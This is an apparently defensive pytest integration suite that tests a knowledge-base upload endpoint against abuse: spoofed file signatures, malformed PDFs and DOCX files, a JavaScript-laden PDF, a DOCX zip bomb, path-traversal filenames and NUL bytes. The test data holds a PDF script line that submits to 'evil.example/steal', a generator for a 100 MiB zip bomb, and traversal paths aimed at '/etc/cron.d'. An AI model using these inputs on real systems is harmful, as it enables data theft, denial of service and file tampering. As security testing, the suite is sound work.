"""Attack 9: upload abuse through the real knowledge endpoints with real (inline) ingestion."""

from __future__ import annotations

import io
import zipfile

import pytest
from adv_support import MAX_UPLOAD, World, assert_safe_error, chat
from sqlalchemy import select

from app.models import Chunk

pytestmark = pytest.mark.integration


def _pdf(text: str, js: str | None = None, *, extra: str = "") -> bytes:
    """Minimal hand-built PDF with one text page and an optional /OpenAction JavaScript."""
    stream = f"BT /F1 12 Tf 72 720 Td ({text}) Tj ET"
    catalog = "<< /Type /Catalog /Pages 2 0 R" + (" /OpenAction 5 0 R" if js else "") + " >>"
    objects = [
        catalog,
        "<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R "
        "/Resources << /Font << /F1 6 0 R >> >> >>",
        f"<< /Length {len(stream)} >>\nstream\n{stream}\nendstream",
        f"<< /Type /Action /S /JavaScript /JS ({js or ''}) >>",
        "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    ]
    out = bytearray(b"%PDF-1.4\n")
    offsets = []
    for number, body in enumerate(objects, 1):
        offsets.append(len(out))
        out += f"{number} 0 obj\n{body}\nendobj\n".encode("latin-1")
    xref = len(out)
    out += f"xref\n0 {len(objects) + 1}\n0000000000 65535 f \n".encode()
    for offset in offsets:
        out += f"{offset:010d} 00000 n \n".encode()
    trailer = f"trailer\n<< /Size {len(objects) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n"
    out += (trailer + f"%%EOF\n{extra}").encode()
    return bytes(out)


def _docx(document_xml: bytes, *, compress: int = zipfile.ZIP_DEFLATED) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compress) as archive:
        archive.writestr(
            "[Content_Types].xml",
            '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/'
            'content-types"/>',
        )
        archive.writestr("word/document.xml", document_xml)
    return buffer.getvalue()


async def _upload(client, tenant, name: str, data: bytes, title: str = "Documento"):
    return await client.post(
        "/v1/knowledge/documents",
        headers=tenant.headers,
        files={"file": (name, data, "application/octet-stream")},
        data={"title": title},
    )


async def test_oversized_upload_rejected_without_internals(client, world: World) -> None:
    response = await _upload(client, world.a, "grande.txt", b"a" * (MAX_UPLOAD + 1))
    assert response.status_code == 413
    assert_safe_error(response)


@pytest.mark.parametrize(
    ("name", "data"),
    [
        ("imagem.pdf", b"\x89PNG\r\n\x1a\n" + b"\x00" * 64),
        ("binario.txt", b"\x7fELF\x02\x01\x01" + b"\x00" * 64),
        ("politica.docx", b"%PDF-1.4 not a zip"),
        ("politica.pdf.exe", b"MZ\x90\x00"),
        ("politica", b"sem extensao"),
        ("politica.docx", _docx(b"x").replace(b"word/document.xml", b"word/documenX.xml")),
        ("politica.txt", "texto".encode("utf-16")),
    ],
)
async def test_fake_extension_or_signature_rejected(client, world: World, name, data) -> None:
    response = await _upload(client, world.a, name, data)
    assert response.status_code in (415, 422), response.text
    assert_safe_error(response)


@pytest.mark.parametrize(
    ("name", "data"),
    [
        ("vazio.txt", b""),
        ("quebrado.pdf", b"%PDF-1.7\n1 0 obj << /Type /Catalog >> garbage without xref"),
        ("truncado.pdf", _pdf("Politica de trocas")[:120]),
        ("quebrado.docx", b"PK\x03\x04" + b"\x00" * 200),
        ("so_espacos.txt", b" \n\t \n"),
        ("controle.txt", "‮​\u0007".encode()),
    ],
)
async def test_malformed_documents_fail_safely(client, world: World, name, data) -> None:
    response = await _upload(client, world.a, name, data)
    if response.status_code == 202:  # accepted for async processing -> must end failed, safely
        version = await client.get(
            f"/v1/knowledge/documents/{response.json()['document_id']}/versions/"
            f"{response.json()['version_id']}",
            headers=world.a.headers,
        )
        assert version.json()["status"] == "failed", version.text
        assert_safe_error_text(version.json()["error_message"] or "")
    else:
        assert response.status_code in (413, 415, 422), response.text
        assert_safe_error(response)


def assert_safe_error_text(message: str) -> None:
    lowered = message.casefold()
    for needle in ("traceback", ".py", "pypdf", "zipfile", "exception", "error:"):
        assert needle not in lowered, message


async def test_pdf_with_javascript_never_surfaces_script(client, world: World, session_factory):
    js = "app.alert('pwned'); this.submitForm('https://evil.example/steal')"
    response = await _upload(
        client, world.a, "politica.pdf", _pdf("Politica de garantia Zeta cobre trastes", js)
    )
    assert response.status_code in (202, 422), response.text
    if response.status_code == 422:
        assert_safe_error(response)
        return
    async with session_factory() as s:
        chunks = list(
            await s.scalars(
                select(Chunk).where(Chunk.document_id == response.json()["document_id"])
            )
        )
    content = " ".join(c.content for c in chunks)
    assert "app.alert" not in content and "evil.example" not in content
    reply = await chat(client, world.a, "Politica de garantia Zeta cobre trastes?")
    assert "app.alert" not in reply["reply"] and "evil.example" not in reply["reply"]


async def test_docx_zip_bomb_rejected(client, world: World) -> None:
    bomb = _docx(b"0" * (101 * 1024 * 1024))
    assert len(bomb) < MAX_UPLOAD  # ~100 KiB compressed, >100 MiB expanded
    response = await _upload(client, world.a, "bomba.docx", bomb)
    assert response.status_code in (413, 415, 422), response.text
    assert_safe_error(response)


async def test_docx_with_many_entries_rejected(client, world: World) -> None:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("word/document.xml", b"<w:document/>")
        for index in range(3000):
            archive.writestr(f"x/{index}", b"")
    response = await _upload(client, world.a, "muitos.docx", buffer.getvalue())
    assert response.status_code in (413, 415, 422), response.text
    assert_safe_error(response)


async def test_path_traversal_filename_is_neutralised(client, world: World) -> None:
    response = await _upload(
        client, world.a, "../../../../etc/cron.d/politica.txt", b"Politica de trocas normal."
    )
    assert response.status_code == 202, response.text
    doc = await client.get(
        f"/v1/knowledge/documents/{response.json()['document_id']}", headers=world.a.headers
    )
    assert doc.json()["filename"] == "politica.txt"
    windows = await _upload(client, world.a, "..\\..\\windows\\politica2.txt", b"Outra politica.")
    doc = await client.get(
        f"/v1/knowledge/documents/{windows.json()['document_id']}", headers=world.a.headers
    )
    assert "\\" not in doc.json()["filename"] and ".." not in doc.json()["filename"]


NUL_INPUTS = [
    ("upload-title", "Política\x00 de trocas"),
    ("text-title", "Política\x00 de trocas"),
    ("chat-message", "Olá\x00 tudo bem?"),
]


async def _send_nul(client, world: World, where: str, value: str):
    if where == "upload-title":
        return await _upload(client, world.a, "ok.txt", b"Politica de trocas.", title=value)
    if where == "text-title":
        return await client.post(
            "/v1/knowledge/documents/text",
            headers=world.a.headers,
            json={"title": value, "content": "Politica de trocas."},
        )
    return await client.post("/v1/chat/messages", headers=world.a.headers, json={"message": value})


@pytest.mark.parametrize(("where", "value"), NUL_INPUTS)
async def test_nul_byte_inputs_never_leak_internals(client, world: World, where, value) -> None:
    response = await _send_nul(client, world, where, value)
    if response.status_code >= 400:
        assert_safe_error(response)


@pytest.mark.parametrize(
    ("where", "value"),
    [pytest.param(w, v, id=w) for w, v in NUL_INPUTS],
)
async def test_nul_byte_inputs_are_client_errors_not_500(client, world: World, where, value):
    response = await _send_nul(client, world, where, value)
    assert response.status_code < 500, response.text
